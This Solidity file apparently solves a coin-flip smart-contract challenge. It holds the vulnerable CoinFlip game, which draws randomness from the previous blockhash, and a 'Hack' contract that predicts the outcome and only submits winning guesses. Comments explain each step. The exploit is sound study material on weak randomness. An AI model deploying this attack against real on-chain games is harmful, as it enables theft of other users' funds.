// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    CoinFlip private immutable target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target){ // 1. We need the address of the target contract in the contstructor
        target = CoinFlip(_target);
    }

    function flip() external { // 2. We need to make sure that the flip function only returns when we win the flip
        bool guess = _guess();
        require(target.flip(guess), "guess failed"); // 2.5 We can do this by supplying a guess that first runs in our environment until it returns with a good guess
    }

    function _guess() private view returns(bool) { // 3. Local function for guessing, using the problematic, hardcoded elements
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }

}
contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}